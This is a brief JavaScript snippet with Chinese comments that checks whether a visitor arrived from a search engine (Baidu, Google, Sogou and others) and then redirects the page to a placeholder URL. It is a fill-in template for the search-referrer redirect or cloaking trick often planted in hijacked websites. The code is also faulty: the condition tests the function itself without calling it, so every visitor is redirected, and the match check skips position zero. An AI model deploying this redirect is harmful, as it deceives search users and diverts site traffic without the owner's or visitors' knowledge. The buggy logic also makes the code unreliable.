<script type="text/javascript">

function ishumman() {
	var r = document.referrer;
	r = r.toLowerCase(); //转为小写
	var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.');
	var b = false;
	for (i in aSites){
		if (r.indexOf(aSites[i]) > 0){
			b = true;
			break;
		}
	}
	return b
}

function statics() {
	
}

window.onload = function () {
	if(ishumman)
	{
		self.location = '要跳转的网址';
	}
}

</script>
